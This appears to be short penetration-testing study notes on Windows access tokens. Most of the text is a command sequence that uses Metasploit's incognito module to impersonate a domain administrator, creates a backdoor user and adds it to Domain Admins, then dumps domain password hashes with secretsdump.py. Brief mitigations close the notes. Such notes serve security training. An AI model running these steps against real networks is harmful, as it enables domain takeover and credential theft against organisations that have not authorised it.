What are tokens:
  Temporary keys that allow you access to a system/network without
  having to provide credentials each time you access a file.
  Like cookies for computers.

Two types:
  Delegate - Created for logging into a machine or using
  Remote Desktop
  Impersonate - "non-interactive" such as attaching a network
  drive or a domain logon script

Key flaw:
  Token impersonation - in metasploit pop a shell and: 
    load incognito 
    list_tokens -u
    impersonate_token <DOMAIN>\\<USER>
    shell
    whoami
    ^C
    rev2self
    getuid
    list_tokens -u
    impersonate_token <DOMAIN>\\administrator
    shell
    whoami
  PoC that I am admin:
    net user /add user1 Password1 /domain
    net group "Domain Admins" user1 /ADD /DOMAIN
  Now we can login as the new admin user and dump out password
    secretsdump.py <DOMAIN>.local/user1:'Password1'@<DC_IP>

Mitigation:
  Limit user/group token creation permission
  Account tiering
  Local admin restriction
